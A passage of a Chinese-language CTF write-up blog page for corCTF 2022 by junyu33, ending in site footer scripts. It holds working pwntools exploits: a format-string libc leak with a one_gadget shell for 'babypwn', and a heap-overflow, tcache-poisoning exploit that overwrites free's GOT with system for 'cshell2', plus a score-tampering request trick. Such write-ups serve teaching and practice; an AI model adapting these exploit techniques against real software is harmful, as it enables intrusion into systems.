class="line">&#123;</span><br><span class="line">  freopen(<span class="string">&quot;out&quot;</span>, <span class="string">&quot;r&quot;</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  freopen(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="built_in">stdout</span>);</span><br><span class="line">  <span class="type">int</span> x, y;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2204</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;y);</span><br><span class="line">    <span class="comment">// mp[x][y] = 1;</span></span><br><span class="line">    mp[y][x] = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">600</span>; i++) </span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">600</span>; j++)</span><br><span class="line">      <span class="keyword">if</span> (mp[i][j])</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>gedit缩小查看，发现笔画大致是对的，那应该就是flag了。</p>
+<h2 id="jsonquiz"><a href="#jsonquiz" class="headerlink" title="jsonquiz"></a>jsonquiz</h2><p>最后提交分数的时候抓包把<code>score=0</code>改为<code>score=100</code>即可。</p>
+<h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ one_gadget /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0xe3afe execve(<span class="string">&quot;/bin/sh&quot;</span>, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [r12] == NULL || r12 == NULL</span><br><span class="line"></span><br><span class="line">0xe3b01 execve(<span class="string">&quot;/bin/sh&quot;</span>, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0xe3b04 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>内平栈，格式化字符串泄露libc。由于r12和r15都在栈上，最后把缓冲区换成全0的内存地址，<code>one_gadget</code>一把即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">   io.sendline(<span class="string">&#x27;%7$p&#x27;</span>)</span><br><span class="line">   io.recvuntil(<span class="string">&#x27;Hi, &#x27;</span>)</span><br><span class="line">   libc_base = <span class="built_in">int</span>(io.recv(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">0x6bc0</span> - (<span class="number">0x9c000</span> - <span class="number">0xa4000</span>) <span class="comment"># 0x6bc0 is from IDA func _$LT$str$u20$as$u20$core..fmt..Display$GT$::fmt::he0adfaca1b7317bf which is in main, and the latter offset is from debugging</span></span><br><span class="line">   zero = libc_base + <span class="number">8</span></span><br><span class="line">   one_gadget = <span class="number">0xe3afe</span></span><br><span class="line">   payload = p64(zero)*<span class="number">12</span> + p64(libc_base+one_gadget)</span><br><span class="line">   io.sendline(payload)</span><br></pre></td></tr></table></figure>
+<h2 id="cshell2（赛后补的）"><a href="#cshell2（赛后补的）" class="headerlink" title="cshell2（赛后补的）"></a>cshell2（赛后补的）</h2><p>libc 2.36的heap overflow+tcache poisoning，由于libc 2.36跟2.35的安全机制没啥区别，就用本地的2.35做了。</p>
+<p>io是真的硬伤。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># all io.sendline() or the steam will stuck</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_pointer</span>(<span class="params">leak: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    parts = []</span><br><span class="line"></span><br><span class="line">    parts.append((leak &gt;&gt; <span class="number">36</span>) &lt;&lt; <span class="number">36</span>)</span><br><span class="line">    parts.append((((leak &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFFF</span>) ^ (parts[<span class="number">0</span>] &gt;&gt; <span class="number">36</span>)) &lt;&lt; <span class="number">24</span>)</span><br><span class="line">    parts.append((((leak &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xFFF</span>) ^ ((parts[<span class="number">1</span>] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFFF</span>)) &lt;&lt; <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> parts[<span class="number">0</span>] | parts[<span class="number">1</span>] | parts[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">   <span class="comment"># leak libc</span></span><br><span class="line">   add(<span class="number">0</span>, <span class="number">1032</span>, <span class="string">&#x27;//bin/sh\0&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">   add(<span class="number">1</span>, <span class="number">1032</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">11</span>):</span><br><span class="line">      add(i, <span class="number">1032</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">9</span>):</span><br><span class="line">      dele(i)</span><br><span class="line"></span><br><span class="line">   dele(<span class="number">1</span>) <span class="comment"># unsortedbin</span></span><br><span class="line">   edit(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">1032</span>-<span class="number">64</span>+<span class="number">7</span>)) <span class="comment"># last byte is for &#x27;\n&#x27;</span></span><br><span class="line">   show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">   libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;main_arena&#x27;</span>] - <span class="number">0x60</span></span><br><span class="line">   <span class="comment"># 0x1f2ce0 in glibc-2.35</span></span><br><span class="line">   log.success(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">   <span class="comment"># leak heap</span></span><br><span class="line">   add(<span class="number">11</span>, <span class="number">1032</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="number">0</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment">#8</span></span><br><span class="line">   dele(<span class="number">9</span>)</span><br><span class="line">   edit(<span class="number">11</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="number">0</span>, <span class="string">b&#x27;b&#x27;</span>*(<span class="number">1032</span>-<span class="number">64</span>)+<span class="string">b&#x27;abcdefg&#x27;</span>)</span><br><span class="line">   show(<span class="number">11</span>)</span><br><span class="line">   io.recvuntil(<span class="string">&#x27;abcdefg\n&#x27;</span>)</span><br><span class="line">   heap_base = decrypt_pointer(u64(io.recvuntil(<span class="string">b&#x27;1 Add\n&#x27;</span>)[:-<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))) - <span class="number">0x1000</span></span><br><span class="line">   log.success(<span class="string">&#x27;heap_base: &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">   </span><br><span class="line">   <span class="comment"># getshell</span></span><br><span class="line">   fake_chunk = <span class="string">b&#x27;c&#x27;</span>*(<span class="number">1032</span>-<span class="number">64</span>)+p64(<span class="number">0x411</span>)+p64(((heap_base+<span class="number">0x2730</span>)&gt;&gt;<span class="number">12</span>)^<span class="number">0x404010</span>) <span class="comment"># buf overflow, make the chunk aligned to 16 bytes</span></span><br><span class="line">   edit(<span class="number">11</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="number">0</span>, fake_chunk)</span><br><span class="line">   add(<span class="number">12</span>, <span class="number">1032</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="number">0</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment"># nothing</span></span><br><span class="line"></span><br><span class="line">   io.sendline(<span class="string">&#x27;1&#x27;</span>) <span class="comment"># 0x2730 = 0x250 + 0x410*9 + 0x10 + 0x40</span></span><br><span class="line">   io.sendline(<span class="string">&#x27;13&#x27;</span>)</span><br><span class="line">   io.sendline(<span class="string">&#x27;1032&#x27;</span>)</span><br><span class="line">   io.send(<span class="string">&#x27;n1rvana&#x27;</span>) <span class="comment"># since we make the chunk at 0x401010, it&#x27;s null and we can fill anything</span></span><br><span class="line">   io.send(p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>])) <span class="comment"># where the free.got is</span></span><br><span class="line">   io.send(p64(libc_base+libc.sym[<span class="string">&#x27;puts&#x27;</span>])) <span class="comment"># keeping the same</span></span><br><span class="line">   io.sendline(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">   io.send(p64(libc_base+libc.sym[<span class="string">&#x27;scanf&#x27;</span>])) <span class="comment"># keeping the same</span></span><br><span class="line">   dele(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>原作者： </strong>junyu33
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://junyu33.me/2022/08/11/corctf2022.html" title="corctf2022-wp">https://junyu33.me/2022/08/11/corctf2022.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/crypto/" rel="tag"># crypto</a>
+              <a href="/tags/reverse/" rel="tag"># reverse</a>
+              <a href="/tags/misc/" rel="tag"># misc</a>
+              <a href="/tags/web/" rel="tag"># web</a>
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/07/26/newsite.html" rel="prev" title="博客域名变更小记">
+                  <i class="fa fa-chevron-left"></i> 博客域名变更小记
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2032/02/07/bin_ctf.html" rel="next" title="（置顶）ctf练习(pwn)">
+                  （置顶）ctf练习(pwn) <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments"><div id="twikoo-comments"></div></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2021 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">丨junyu33丨</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">278k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">4:13</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: inline;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: inline;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.4/busuanzi.pure.mini.js"></script>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              const target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    const script = document.createElement('script');
+    script.src = '//cdn.jsdelivr.net/npm/mathjax@3.1.2/es5/tex-mml-chtml.js';
+    script.defer = true;
+    document.head.appendChild(script);
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.typesetClear();
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+
+<script>
+NexT.utils.loadComments('#twikoo-comments', () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js', () => {
+    twikoo.init(Object.assign({"enable":true,"visitor":false,"envId":"https://202182.vercel.app/"}, {
+      el: '#twikoo-comments'
+    }));
+  }, window.twikoo);
+});
+</script>
+
+</body>
+</html>
